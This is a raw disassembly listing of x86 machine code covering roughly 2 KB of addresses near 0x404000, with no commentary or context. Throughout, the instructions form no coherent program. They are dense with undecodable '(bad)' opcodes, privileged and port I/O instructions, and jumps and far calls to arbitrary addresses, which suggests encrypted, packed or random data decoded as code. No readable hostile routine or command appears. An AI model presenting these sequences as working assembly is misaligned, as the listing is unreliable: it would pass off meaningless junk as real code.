  40422f:	mov    ecx,0x24e5e2db
  404234:	dec    esi
  404235:	cmp    edi,DWORD PTR [ecx-0x6b]
  404238:	fmulp  st(7),st
  40423a:	sbb    al,0x91
  40423c:	js     0x404260
  40423e:	mov    DWORD PTR [esi+0x33],ebp
  404241:	pop    ebx
  404242:	sub    DWORD PTR [edx],0xd47becc5
  404248:	popf   
  404249:	mov    BYTE PTR [ecx],bh
  40424b:	xchg   DWORD PTR [edi],ebp
  40424d:	sbb    DWORD PTR [edx],edx
  40424f:	inc    esp
  404250:	add    ecx,DWORD PTR [esi+esi*8]
  404253:	pop    ebx
  404254:	fisub  DWORD PTR [edi+ecx*8+0x5c]
  404258:	mov    ah,0xbe
  40425a:	dec    ecx
  40425b:	data16 in al,0xd
  40425e:	rol    DWORD PTR [esi-0x4fa5247f],cl
  404264:	out    dx,al
  404265:	test   al,0xa4
  404267:	mov    al,0x6b
  404269:	fidiv  DWORD PTR [edx+0x33]
  40426c:	das    
  40426d:	push   es
  40426e:	in     al,0xff
  404270:	out    0x94,al
  404272:	push   ecx
  404273:	(bad)  
  404274:	mov    edi,0x248363a5
  404279:	mov    ss,WORD PTR [eax]
  40427b:	mov    WORD PTR [edx+eax*4+0x1a],?
  40427f:	out    dx,eax
  404280:	or     al,0xe3
  404282:	dec    eax
  404283:	dec    edi
  404284:	es mov cl,0x21
  404287:	iret   
  404288:	push   ecx
  404289:	mov    eax,ds:0xbed069c7
  40428e:	(bad)  
  40428f:	pusha  
  404290:	mov    eax,ds:0xd884e7da
  404295:	lods   al,BYTE PTR ds:[esi]
  404296:	ffreep st(2)
  404298:	fisubr DWORD PTR ds:0x4227edd4
  40429e:	int3   
  40429f:	(bad)  
  4042a0:	in     eax,dx
  4042a1:	mov    bh,0xd3
  4042a3:	enter  0x3f85,0xac
  4042a7:	add    al,BYTE PTR [ebx+edx*1-0x5a03700]
  4042ae:	fbld   TBYTE PTR [edi]
  4042b1:	in     eax,0x33
  4042b3:	nop
  4042b4:	call   0x67ac8261
  4042b9:	cmp    ebp,DWORD PTR ds:[ebx-0x19]
  4042bd:	or     edi,DWORD PTR [edx+eiz*1+0x1a861f1f]
  4042c4:	sbb    DWORD PTR [bx],esi
  4042c7:	push   esp
  4042c8:	div    DWORD PTR [esi-0x6d183b93]
  4042ce:	and    DWORD PTR [ecx+0x68079549],edi
  4042d4:	mov    ds,WORD PTR [edi]
  4042d6:	cmp    eax,0x8dcee93c
  4042db:	(bad)  
  4042dc:	mov    al,0x1e
  4042de:	mov    ch,al
  4042e0:	fwait
  4042e1:	dec    eax
  4042e2:	fistp  QWORD PTR [ebp+esi*2+0x14]
  4042e6:	jp     0x4042f5
  4042e8:	xor    dh,BYTE PTR [edi-0x5c2b38f9]
  4042ee:	sbb    DWORD PTR [edx-0x61ea1ba5],ebp
  4042f4:	push   0xc8aae4e8
  4042f9:	mov    dh,0x29
  4042fb:	dec    ebp
  4042fc:	mov    DWORD PTR [esi-0x5f62ba05],eax
  404302:	pop    esi
  404303:	push   cs
  404304:	imul   esp,esi,0xb
  404307:	mov    ch,0xeb
  404309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40430a:	ja     0x404347
  40430c:	xchg   ecx,eax
  40430d:	and    al,ah
  40430f:	sub    DWORD PTR [esp+ebp*8+0x14],edx
  404313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404314:	pop    ds
  404315:	mov    al,0x22
  404317:	fcmovnbe st,st(4)
  404319:	cmp    ebx,DWORD PTR [ebx+0x1fb25aa6]
  40431f:	inc    eax
  404320:	(bad)  
  404321:	jb     0x40434a
  404323:	and    al,0xf7
  404325:	jne    0x40431f
  404327:	mov    cl,bh
  404329:	mov    ecx,0x3a24a86b
  40432e:	add    eax,0x3e4daeec
  404333:	jg     0x4042ca
  404335:	lea    edx,[ebx+0x14]
  404338:	icebp  
  404339:	inc    eax
  40433a:	mov    eax,ds:0x23bd3df
  40433f:	xchg   ebx,eax
  404340:	cli    
  404341:	mov    ebx,0x8aece5de
  404346:	adc    DWORD PTR [ebp-0x26a9a359],esi
  40434c:	cmp    ch,ah
  40434e:	dec    esp
  40434f:	sub    BYTE PTR [ecx],0x52
  404352:	mov    bh,0xc2
  404354:	pop    ebp
  404355:	dec    ax
  404357:	out    dx,al
  404358:	mov    ah,0xfd
  40435a:	inc    ebp
  40435b:	into   
  40435c:	repnz dec esp
  40435e:	in     eax,0x15
  404360:	add    eax,0xad624bb6
  404365:	jmp    0x4043a3
  404367:	jo     0x404317
  404369:	jle    0x4042fc
  40436b:	sbb    eax,0x1c310f21
  404370:	enter  0x77c5,0xcd
  404374:	sub    BYTE PTR [edi+0x7462ae9d],dh
  40437a:	cmp    eax,0x9b00741d
  40437f:	or     ebx,DWORD PTR [edx-0x21ee90cb]
  404385:	stc    
  404386:	sub    edx,ebx
  404388:	sahf   
  404389:	gs mov ecx,0x6d8a0fe8
  40438f:	ins    DWORD PTR es:[edi],dx
  404390:	leave  
  404391:	push   esi
  404392:	lds    esi,FWORD PTR [ebx+0x5e089fe9]
  404398:	mov    edi,0x7273968e
  40439d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40439e:	ret    0x3266
  4043a1:	ins    DWORD PTR es:[edi],dx
  4043a2:	mov    BYTE PTR [eax],ch
  4043a4:	mov    ebp,0x7c4e5633
  4043a9:	fimul  DWORD PTR [eax-0x37aac480]
  4043af:	xchg   esi,eax
  4043b0:	inc    ebx
  4043b1:	dec    esi
  4043b2:	and    BYTE PTR [ebp+0x3b7338ab],ch
  4043b8:	mov    al,0xe1
  4043ba:	mov    eax,ds:0xd0b7a1da
  4043bf:	jmp    DWORD PTR [edx-0x60b0ce5f]
  4043c5:	test   BYTE PTR [ebx+0x34],ah
  4043c8:	bound  eax,QWORD PTR [edi+0x33]
  4043cb:	imul   esp,DWORD PTR [eax],0x3f
  4043ce:	mov    eax,ds:0x9566374e
  4043d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d4:	ins    DWORD PTR es:[edi],dx
  4043d5:	loope  0x40440c
  4043d7:	(bad)  
  4043d8:	mov    bl,0x82
  4043da:	cli    
  4043db:	loop   0x40444a
  4043dd:	cmc    
  4043de:	xor    bh,BYTE PTR [eax]
  4043e0:	mov    ah,0x47
  4043e2:	mov    ds:0xcdb22266,al
  4043e7:	push   cs
  4043e8:	call   0x66672d99
  4043ed:	and    al,0xd9
  4043ef:	loopne 0x40443d
  4043f1:	sub    eax,0x813ba5e9
  4043f6:	sbb    BYTE PTR [ebx+0x1b86da54],al
  4043fc:	xchg   edx,eax
  4043fd:	pop    eax
  4043fe:	cmp    DWORD PTR [ebx-0x54],ecx
  404401:	mov    ds:0xc74c9aef,al
  404406:	gs xchg ebp,eax
  404408:	dec    edi
  404409:	les    ebp,FWORD PTR [ecx-0x71]
  40440c:	mov    WORD PTR [ebx],ds
  40440e:	call   0xcc46:0x9f997806
  404415:	das    
  404416:	or     al,0xdf
  404418:	icebp  
  404419:	pop    eax
  40441a:	push   ebp
  40441b:	cmc    
  40441c:	mov    esp,0x7f20c3e
  404421:	jns    0x4043f1
  404423:	push   ss
  404424:	xchg   esi,eax
  404425:	jmp    0x40cb079a
  40442a:	mov    dh,0x8c
  40442c:	mov    esp,DWORD PTR [eax+0x97bfe69]
  404432:	mov    eax,0x4987472e
  404437:	imul   esi,DWORD PTR ds:0x640ade9e,0xffffffec
  40443e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443f:	xchg   DWORD PTR [edi-0x2f],ebp
  404442:	clc    
  404443:	into   
  404444:	mov    ebx,0xf79b418
  404449:	adc    esi,DWORD PTR [edx-0x56]
  40444c:	jae    0x404442
  40444e:	arpl   WORD PTR [ecx-0x30b6133d],bx
  404454:	mov    esp,0x58e344cb
  404459:	repz mov cl,0x27
  40445c:	dec    eax
  40445d:	je     0x4044d6
  40445f:	jae    0x40448d
  404461:	mov    WORD PTR ds:0x9861476,cs
  404467:	push   esp
  404468:	sub    al,0xaa
  40446a:	test   al,0xbc
  40446c:	ins    DWORD PTR es:[edi],dx
  40446d:	in     eax,dx
  40446e:	mov    ds:0xf92b44fb,eax
  404473:	lar    eax,WORD PTR [edx-0x1]
  404477:	pop    eax
  404478:	mov    DWORD PTR ds:0x4e85,eax
  40447d:	sub    ebx,DWORD PTR [edi-0x38]
  404480:	shl    BYTE PTR [ebx-0x230d876c],0xee
  404487:	sbb    DWORD PTR ds:0xb3ae2016,0x47
  40448e:	mov    gs,WORD PTR [ebp-0x42]
  404491:	mov    eax,0x7c920419
  404496:	test   al,0xa3
  404498:	and    edi,DWORD PTR [esi]
  40449a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40449b:	fist   DWORD PTR [eax+0x52]
  40449e:	dec    ecx
  40449f:	xchg   ecx,eax
  4044a0:	jae    0x4044fe
  4044a2:	daa    
  4044a3:	mov    ecx,0xeecdde1d
  4044a8:	out    0x51,al
  4044aa:	mov    ds:0x33dec2aa,eax
  4044af:	hlt    
  4044b0:	rcl    dh,1
  4044b2:	sub    BYTE PTR [ebx+0x2399db12],ch
  4044b8:	jp     0x404482
  4044ba:	clc    
  4044bb:	sbb    eax,eax
  4044bd:	repz pop ebp
  4044bf:	sub    eax,0xe72892e
  4044c4:	ins    DWORD PTR es:[edi],dx
  4044c5:	add    cl,bh
  4044c7:	jmp    0xf8a2:0x437b7799
  4044ce:	fcomp  DWORD PTR [edx+ebp*4-0x5f85171d]
  4044d5:	cmc    
  4044d6:	mov    dl,0xf5
  4044d8:	sub    al,0x30
  4044da:	sub    DWORD PTR [ebx],ecx
  4044dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044de:	sub    bl,dh
  4044e0:	cmp    DWORD PTR [edi-0xe],0xfd8a3aca
  4044e7:	lea    eax,[eax]
  4044e9:	xchg   ebp,eax
  4044ea:	outs   dx,DWORD PTR ds:[esi]
  4044eb:	push   0xffffffe3
  4044ed:	mov    ebp,0xc6e32af5
  4044f2:	pop    esi
  4044f3:	and    bl,0xce
  4044f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f7:	fcmovne st,st(3)
  4044f9:	ins    DWORD PTR es:[edi],dx
  4044fa:	scas   eax,DWORD PTR es:[edi]
  4044fb:	sbb    DWORD PTR [edx-0x4654777f],esp
  404501:	repnz int 0x4f
  404504:	add    ah,al
  404506:	fisttp DWORD PTR [esi-0x2a]
  404509:	fs pop eax
  40450b:	jp     0x404574
  40450d:	mov    ds:0x9f19fb5b,eax
  404512:	loopne 0x40451f
  404514:	xchg   DWORD PTR [ecx-0x49],ecx
  404517:	xchg   ebx,eax
  404518:	push   eax
  404519:	jle    0x40454c
  40451b:	mov    ds:0xbc7a3dd3,eax
  404520:	lea    ebx,[esi+0x2fd97637]
  404526:	sub    dh,0xaf
  404529:	aam    0xa4
  40452b:	mov    al,ds:0x87ea7a06
  404530:	test   dl,bh
  404532:	push   ss
  404533:	adc    ch,BYTE PTR [edx+0x72935989]
  404539:	adc    bl,BYTE PTR [esi+edi*2-0x80]
  40453d:	inc    ebp
  40453e:	test   eax,0x61e90723
  404543:	ss in  eax,0xeb
  404546:	call   0x8863:0x48a767b6
  40454d:	mov    dl,0x39
  40454f:	rcl    BYTE PTR [ebx-0x45],cl
  404552:	cli    
  404553:	or     ebx,DWORD PTR [edx+esi*1]
  404556:	pause  
  404558:	and    eax,0xc5841ebc
  40455d:	dec    eax
  40455e:	imul   esp,DWORD PTR [ecx+0x50c2349d],0xf2013fad
  404568:	pop    edx
  404569:	arpl   bp,dx
  40456b:	sub    eax,0x8ec7c2b9
  404570:	xchg   ecx,eax
  404571:	adc    eax,DWORD PTR [ebx-0x3f]
  404574:	jp     0x4045c6
  404576:	ja     0x4045a7
  404578:	xor    al,0x27
  40457a:	or     al,BYTE PTR [esi+0x5b]
  40457d:	mov    ebx,0x836f91a9
  404582:	mov    bl,0x7d
  404584:	pop    eax
  404585:	xchg   ebp,eax
  404586:	sbb    DWORD PTR [esi+0x5c5215a9],ebx
  40458c:	mul    ebp
  40458e:	out    dx,eax
  40458f:	xor    DWORD PTR [eax],ecx
  404591:	sub    eax,0x21388c88
  404596:	adc    ebx,DWORD PTR [edi-0x1d4344d2]
  40459c:	sub    eax,0xf623e549
  4045a1:	pop    ds
  4045a2:	scas   eax,DWORD PTR es:[edi]
  4045a3:	idiv   DWORD PTR [eax+eax*1]
  4045a6:	jg     0x4045e3
  4045a8:	pop    edx
  4045a9:	jg     0x404571
  4045ab:	mov    eax,ds:0xcdba25e1
  4045b0:	mov    dl,cl
  4045b2:	std    
  4045b3:	call   0xb920:0x217e3b70
  4045ba:	mov    ebp,0xba86567a
  4045bf:	retf   0x7901
  4045c2:	mov    al,0x95
  4045c4:	add    eax,0x744f6fa2
  4045c9:	fdiv   QWORD PTR [edx]
  4045cb:	fmulp  st(1),st
  4045cd:	(bad)  
  4045ce:	enter  0x257e,0x76
  4045d2:	jnp    0x404622
  4045d4:	sbb    dl,BYTE PTR [ebx-0x19]
  4045d7:	mov    dh,0xff
  4045d9:	jbe    0x404623
  4045db:	jns    0x4045c3
  4045dd:	gs cs gs inc ebp
  4045e1:	(bad)  
  4045e2:	outs   dx,DWORD PTR ds:[esi]
  4045e3:	call   0x16a2:0xffe9b6ed
  4045ea:	pop    edi
  4045eb:	xchg   ebp,eax
  4045ec:	fs adc al,0x7e
  4045ef:	sbb    dl,BYTE PTR [eax+0x5995a447]
  4045f5:	jns    0x4045cd
  4045f7:	fwait
  4045f8:	push   es
  4045f9:	sar    BYTE PTR [esi+0x34],1
  4045fc:	test   DWORD PTR [eax],edx
  4045fe:	xor    al,0x55
  404600:	jp     0x4045f8
  404602:	xchg   edi,eax
  404603:	rol    bh,1
  404605:	cld    
  404606:	and    esp,esp
  404608:	fistp  DWORD PTR [eax]
  40460a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460b:	dec    ecx
  40460c:	push   ebp
  40460d:	pop    esi
  40460e:	mov    edx,0x6affb294
  404613:	or     al,BYTE PTR [edi+0x2fdf99db]
  404619:	dec    ecx
  40461a:	mov    cl,BYTE PTR [edx+0x3]
  40461d:	aaa    
  40461e:	cli    
  40461f:	or     eax,0xb1a7d2d2
  404624:	ffree  st(1)
  404626:	in     eax,dx
  404627:	push   ebx
  404628:	mov    WORD PTR [edi],gs
  40462a:	xor    eax,0x5db26b08
  40462f:	retf   0x8f3d
  404632:	dec    ebp
  404633:	dec    eax
  404634:	sbb    dl,0x81
  404637:	jg     0x4046a9
  404639:	call   0xf7f:0x569a1ce
  404640:	sub    al,0xc0
  404642:	jmp    0x9fe898dd
  404647:	pop    ebx
  404648:	inc    ecx
  404649:	cdq    
  40464a:	hlt    
  40464b:	scas   al,BYTE PTR es:[edi]
  40464c:	pop    esp
  40464d:	test   BYTE PTR [edi+edx*8],bl
  404650:	add    eax,0xb4a6f8bf
  404655:	mov    esi,0x78fb3e4e
  40465a:	(bad)  
  40465b:	(bad)  
  40465c:	mov    dh,0x89
  40465e:	dec    ebp
  40465f:	aad    0x16
  404661:	(bad)  
  404662:	(bad)  
  404663:	cmp    al,0x8e
  404665:	or     DWORD PTR [eax+0x46],ebp
  404668:	jns    0x4045ea
  40466a:	xor    ebx,DWORD PTR [eax+0x2edd4894]
  404670:	adc    eax,ebx
  404672:	sahf   
  404673:	push   0x763bcbb3
  404678:	mov    ebp,0xb9156228
  40467d:	leave  
  40467e:	ficom  WORD PTR es:[eax+esi*4+0x3c8138a9]
  404686:	adc    ebp,ecx
  404688:	mov    esi,0x20a93458
  40468d:	push   ebp
  40468e:	mov    al,ds:0xc88e4dfb
  404693:	xor    ah,ch
  404695:	jge    0x4046b4
  404697:	sbb    al,0xf0
  404699:	xor    bh,BYTE PTR [eax-0x10]
  40469c:	aam    0x2e
  40469e:	(bad)  
  40469f:	or     al,0xea
  4046a1:	adc    bl,BYTE PTR [ecx-0x62]
  4046a4:	nop
  4046a5:	xchg   esi,eax
  4046a6:	xchg   edi,eax
  4046a7:	lock adc cl,al
  4046aa:	mov    ecx,0x26ff0f1
  4046af:	dec    ebp
  4046b0:	fldenv [ebp-0x3b]
  4046b3:	push   edi
  4046b4:	icebp  
  4046b5:	jge    0x404645
  4046b7:	lea    ecx,[esi-0x7080bf28]
  4046bd:	push   esi
  4046be:	xor    eax,0x9ce2cb82
  4046c4:	(bad)  
  4046c5:	mov    cl,0x2
  4046c7:	cld    
  4046c8:	mov    ecx,gs
  4046ca:	outs   dx,DWORD PTR ds:[esi]
  4046cb:	add    ah,BYTE PTR [edi]
  4046cd:	jp     0x40470c
  4046cf:	push   0x52
  4046d1:	icebp  
  4046d2:	ror    BYTE PTR [ecx+ebx*8-0x58],0xe8
  4046d7:	inc    eax
  4046d8:	out    0x40,eax
  4046da:	xchg   edx,eax
  4046db:	call   0xe7fdb6a5
  4046e0:	sar    BYTE PTR [eax],1
  4046e2:	arpl   WORD PTR [ebp+0x1e94045f],bp
  4046e8:	loopne 0x404734
  4046ea:	adc    edi,DWORD PTR [esi-0x61ca3805]
  4046f0:	in     al,dx
  4046f1:	mov    DWORD PTR [ebx+0xf17f6b],edi
  4046f7:	mov    edx,0x4aee10be
  4046fc:	push   es
  4046fd:	adc    dh,BYTE PTR [esp+eiz*4-0x2f470eef]
  404704:	jmp    0xa897:0x99bb2661
  40470b:	add    BYTE PTR [ebp+0x5c],ch
  40470e:	ins    BYTE PTR es:[edi],dx
  40470f:	je     0x404739
  404711:	lods   al,BYTE PTR ds:[esi]
  404712:	ins    DWORD PTR es:[edi],dx
  404713:	ret    0x1c3a
  404716:	and    eax,DWORD PTR [edi-0x61edca20]
  40471c:	test   eax,0x1baf723c
  404721:	adc    eax,0xdb47230d
  404726:	test   al,0xeb
  404728:	cmp    DWORD PTR [ebp-0x11],edi
  40472b:	cld    
  40472c:	dec    edx
  40472d:	mov    ecx,ds
  40472f:	adc    dh,bh
  404731:	out    dx,al
  404732:	or     ebp,esp
  404734:	sbb    esi,DWORD PTR [ebx-0x64]
  404737:	sub    ah,bh
  404739:	aaa    
  40473a:	mov    esi,0xc532f532
  40473f:	aad    0xf8
  404741:	adc    DWORD PTR [ebx],eax
  404743:	xchg   esp,ebp
  404745:	addr16 out dx,al
  404747:	dec    eax
  404748:	mov    al,0x56
  40474a:	mov    dh,0x98
  40474c:	test   DWORD PTR [ebp-0x6d5afea1],eax
  404752:	in     al,dx
  404753:	mov    esp,0x32e1ea8f
  404758:	ret    0x269f
  40475b:	ins    BYTE PTR es:[edi],dx
  40475c:	into   
  40475d:	and    DWORD PTR [edi-0x4d],eax
  404760:	push   edx
  404761:	shr    BYTE PTR [edi-0x21],1
  404764:	push   edi
  404765:	sub    dh,BYTE PTR [eax+eax*4]
  404768:	or     BYTE PTR [ecx-0x24],cl
  40476b:	data16 xor al,0x83
  40476e:	dec    eax
  40476f:	loope  0x404751
  404771:	out    0x55,eax
  404773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404774:	and    BYTE PTR [ecx],0x14
  404777:	push   0xd5c7e1bc
  40477c:	or     edx,esp
  40477e:	mov    esi,0x9a733f88
  404783:	jp     0x4047f1
  404785:	push   0x150f6849
  40478a:	sub    ebx,DWORD PTR [esi+ecx*8]
  40478d:	dec    esi
  40478e:	push   edi
  40478f:	sahf   
  404790:	fadd   DWORD PTR [edi+0x44]
  404793:	mov    al,ds:0x594bbf62
  404798:	shl    DWORD PTR [eax],0xf9
  40479b:	int    0xc
  40479d:	pop    ss
  40479e:	aad    0x3a
  4047a0:	addr16 mov edx,0x8ca4681a
  4047a6:	adc    DWORD PTR [edx],eax
  4047a8:	push   edx
  4047a9:	ins    BYTE PTR es:[edi],dx
  4047aa:	rcr    BYTE PTR [ebx+0xa],0x2a
  4047ae:	and    ah,BYTE PTR [eax]
  4047b0:	test   ch,ah
  4047b2:	test   eax,0x49bfeb0
  4047b7:	arpl   WORD PTR [ecx],bp
  4047b9:	(bad)  
  4047ba:	lahf   
  4047bb:	xchg   ebp,eax
  4047bc:	xor    DWORD PTR [ecx-0x3b],edx
  4047bf:	daa    
  4047c0:	cld    
  4047c1:	mov    bl,0x8
  4047c3:	loopne 0x4047d7
  4047c5:	(bad)
  4047c8:	mov    edi,0x31f1086f
  4047cd:	pop    eax
  4047ce:	mov    al,0x94
  4047d0:	and    bh,BYTE PTR [ebx+0xe]
  4047d3:	outs   dx,BYTE PTR ds:[esi]
  4047d4:	jl     0x4047f5
  4047d6:	pop    eax
  4047d7:	xchg   esi,eax
  4047d8:	hlt    
  4047d9:	mov    dl,0xfd
  4047db:	mov    dh,0x9f
  4047dd:	in     al,0x7b
  4047df:	cdq    
  4047e0:	icebp  
  4047e1:	mov    cl,BYTE PTR [edx+0x4d]
  4047e4:	in     eax,dx
  4047e5:	cmp    DWORD PTR [ebp+0x5f],ecx
  4047e8:	pop    ebx
  4047e9:	push   0xffffffa4
  4047eb:	adc    ah,BYTE PTR [edi]
  4047ed:	(bad)  
  4047ef:	mov    ecx,0x675cead6
  4047f4:	addr16 call 0x7fa8e17f
  4047fa:	sbb    ch,dl
  4047fc:	xchg   BYTE PTR [esp+eax*1-0x39f0140b],cl
  404803:	cmp    al,0x10
  404805:	pop    ss
  404806:	or     bh,0x46
  404809:	ins    DWORD PTR es:[edi],dx
  40480a:	mov    ebx,0x5dfecf47
  40480f:	pop    ebx
  404810:	pop    esi
  404811:	jl     0x4047b8
  404813:	popf   
  404814:	adc    al,BYTE PTR [ecx-0x50fbe079]
  40481a:	push   edx
  40481b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40481c:	mov    dh,0x61
  40481e:	int    0x9
  404820:	(bad)  
  404821:	xlat   BYTE PTR ds:[ebx]
  404822:	es push 0xe
  404825:	sbb    esi,DWORD PTR [ecx]
  404827:	imul   esp,DWORD PTR [edi],0xc99c57d4
  40482d:	ret    0x13e9
  404830:	ds sbb eax,0xd0c4af2b
  404836:	push   ss
  404837:	loopne 0x4048a5
  404839:	mov    al,ds:0x2c4af09b
  40483e:	out    dx,eax
  40483f:	sbb    BYTE PTR [ebx],ah
  404841:	sbb    ah,ah
  404843:	jecxz  0x404871
  404845:	push   ecx
  404846:	(bad)  
  404847:	jmp    0xe44beb8e
  40484c:	(bad)  
  40484d:	fld    QWORD PTR [ebx+0x41]
  404850:	mov    ecx,0x8bc1fbcb
  404855:	and    bl,BYTE PTR [ebp-0x65]
  404858:	ins    BYTE PTR es:[edi],dx
  404859:	xor    edx,edi
  40485b:	ja     0x404855
  40485d:	outs   dx,DWORD PTR ds:[esi]
  40485e:	inc    ecx
  40485f:	xchg   ch,ah
  404861:	aaa    
  404862:	int    0xef
  404864:	shr    BYTE PTR [ecx-0x3b52f52],cl
  40486a:	jmp    0xadda1b56
  40486f:	aas    
  404870:	daa    
  404871:	int3   
  404872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404873:	xchg   BYTE PTR [edx+0x69],cl
  404876:	arpl   WORD PTR [ebp+0x4fb2ac4e],bp
  40487c:	jecxz  0x40487c
  40487e:	clc    
  40487f:	ret    
  404880:	adc    edi,DWORD PTR [edi+0x2c]
  404883:	test   BYTE PTR [ebx+0x14],bl
  404886:	mov    ds:0x9b691d8f,al
  40488b:	xor    esp,0xffffffee
  40488e:	push   ebp
  40488f:	add    dh,BYTE PTR [eax+0xf6078a9]
  404895:	es xchg edx,eax
  404897:	push   esi
  404898:	(bad)  
  40489a:	jmp    0x7895:0x6fa9d798
  4048a1:	loopne 0x40483d
  4048a3:	dec    ebx
  4048a4:	scas   eax,DWORD PTR es:[edi]
  4048a5:	test   DWORD PTR [esi-0x6ada9384],esp
  4048ab:	ret    0xd70c
  4048ae:	xor    BYTE PTR [ecx+0x1a10d392],0xe3
  4048b5:	ficom  WORD PTR [edx+esi*1]
  4048b8:	pop    ds
  4048b9:	into   
  4048ba:	push   0xa7e1cd8c
  4048bf:	data16 int3 
  4048c1:	call   0xf854:0xec85b534
  4048c8:	or     BYTE PTR [esi+0x6f],ah
  4048cb:	ins    DWORD PTR es:[edi],dx
  4048cc:	mov    ah,0x67
  4048ce:	cdq    
  4048cf:	inc    eax
  4048d0:	lea    esi,[eax+0x37]
  4048d3:	sbb    BYTE PTR [edi],ch
  4048d5:	dec    eax
  4048d6:	adc    eax,0x23202bb
  4048db:	add    BYTE PTR [eax-0x6bdcb986],bh
  4048e1:	or     esi,DWORD PTR [edx+edi*8]
  4048e4:	ins    BYTE PTR es:[edi],dx
  4048e5:	xor    BYTE PTR [ebp+0x217df4dc],bl
  4048eb:	mov    ds:0xc8caad6c,al
  4048f0:	sbb    ax,0xe460
  4048f4:	and    DWORD PTR [eax+ecx*4],0xffffff82
  4048f8:	add    ch,BYTE PTR [ebp+ebx*2-0x37e99485]
  4048ff:	pop    esi
  404900:	push   0xffffff8e
  404902:	mov    edi,0xc1b6cf60
  404907:	ja     0x404965
  404909:	out    dx,eax
  40490a:	sbb    eax,0x621dc1c
  40490f:	(bad)  
  404910:	sti    
  404911:	inc    esi
  404912:	pop    edi
  404913:	jne    0x404991
  404915:	std    
  404916:	in     al,0xff
  404918:	out    0x18,al
  40491a:	xor    bh,BYTE PTR [eax+eax*1-0x55a22c96]
  404921:	jmp    0x404916
  404923:	int    0xf
  404925:	(bad)  
  404926:	loope  0x4048ad
  404928:	nop
  404929:	xor    DWORD PTR [edi+0x3b],0x303e5b09
  404930:	cmp    dh,BYTE PTR ds:0xa01345ca
  404936:	pop    ebx
  404937:	adc    esp,DWORD PTR [ecx+0x57]
  40493a:	adc    al,0x36
  40493c:	out    0xe5,eax
  40493e:	xorps  xmm5,XMMWORD PTR [esp+edx*8+0x41]
  404943:	push   ebx
  404944:	jnp    0x4049bb
  404946:	cmp    BYTE PTR [edx],dh
  404948:	test   BYTE PTR [ebx+edi*2+0x10],dl
  40494c:	cmp    eax,0xd1888a75
  404951:	es mov ecx,0x56605bb1
  404957:	push   ebx
  404958:	les    eax,FWORD PTR [esi]
  40495a:	xchg   ebp,eax
  40495b:	frstor [ecx]
  40495d:	es jb  0x4049bc
  404960:	fcomp  st(2)
  404962:	test   al,bl
  404964:	cs (bad) 
  404966:	sbb    BYTE PTR [ebx+ebp*4],ah
  404969:	arpl   WORD PTR ds:0x7000b647,ax
  40496f:	hlt    
  404970:	mov    esp,0x16b21076
  404975:	ins    DWORD PTR es:[edi],dx
  404976:	dec    eax
  404977:	or     ecx,DWORD PTR [eax]
  404979:	rcr    DWORD PTR [ebp-0x72],0x7d
  40497d:	fmul   QWORD PTR [ebx]
  40497f:	cs sti 
  404981:	out    dx,eax
  404982:	cwde   
  404983:	pop    ebp
  404984:	mul    DWORD PTR [ebx]
  404986:	(bad)  
  404987:	cmp    ebp,ecx
  404989:	mov    dl,0x68
  40498b:	jmp    0x5513:0xa7a82bb4
  404992:	mov    gs,WORD PTR [esp+ecx*4-0x18]
  404996:	mov    ebx,0xf726837c
  40499b:	stc    
  40499c:	mov    cl,BYTE PTR [edi]
  40499e:	add    eax,0x43d8531d
  4049a3:	retf   
  4049a4:	ret    
  4049a5:	dec    eax
  4049a6:	or     eax,ebx
  4049a8:	aas    
  4049a9:	inc    esp
  4049aa:	jecxz  0x4049e4
  4049ac:	or     ch,BYTE PTR [eax+0x9ab9d26]
  4049b2:	wrmsr  
  4049b4:	shr    BYTE PTR [edi-0x15],0x2f
  4049b8:	enter  0x5944,0xb3
  4049bc:	aad    0x32
  4049be:	pop    ds
  4049bf:	pop    ecx
  4049c0:	shl    BYTE PTR [ebx],1
  4049c2:	xor    DWORD PTR [edi-0x242e4c0b],ecx
  4049c8:	lock mov al,ds:0x1e048709
  4049ce:	mov    eax,0xa49ef680
  4049d3:	or     cl,BYTE PTR [eax]
  4049d5:	xor    ebx,esi
  4049d7:	out    0xf,eax
  4049d9:	es ja  0x404a30
  4049dc:	int    0x65
  4049de:	pop    eax
  4049df:	push   edi
  4049e0:	inc    esi
  4049e1:	jns    0x404a5b
  4049e3:	aad    0x6a
  4049e5:	push   es
  4049e6:	lods   al,BYTE PTR ds:[esi]
  4049e7:	clc    
  4049e8:	imul   ecx,DWORD PTR [ebx+esi*2-0x676f651e],0xcd32df8b
  4049f3:	pop    eax
  4049f4:	mov    ch,0xfa
  4049f6:	ins    DWORD PTR es:[edi],dx
  4049f7:	dec    esp
  4049f8:	dec    ebp
  4049f9:	or     DWORD PTR [eax+0x6cb4e54e],0xb752d40c
  404a03:	sub    BYTE PTR [edx-0x5a],cl
  404a06:	mov    DWORD PTR [edx],esi
  404a08:	fld    QWORD PTR [ebx]
  404a0a:	sub    BYTE PTR [edx-0x40],ch
  404a0d:	in     al,dx
  404a0e:	in     al,0x42
  404a10:	add    al,BYTE PTR [eax]
  404a12:	out    dx,eax
  404a13:	inc    edi
  404a14:	or     dh,BYTE PTR [edx-0x28]
  404a17:	inc    eax
  404a18:	or     esp,DWORD PTR [edi-0x2a]
  404a1b:	xlat   BYTE PTR ds:[ebx]
  404a1c:	and    BYTE PTR [ecx+eax*1+0x6c411b2c],0x34
  404a24:	xchg   ebp,eax
  404a25:	sub    DWORD PTR [esp+edx*2+0x68863eda],eax
  404a2c:	lods   al,BYTE PTR ds:[esi]
  404a2d:	popf   
  404a2e:	(bad)  [ecx+0x20380abd]
  404a34:	jmp    0x404a70
  404a36:	xchg   edi,eax
  404a37:	pop    ds
  404a38:	retf   0x1509
  404a3b:	test   al,0x46
  404a3d:	hlt    
  404a3e:	rcl    BYTE PTR [edi+0x0],1
  404a41:	sbb    al,0x19
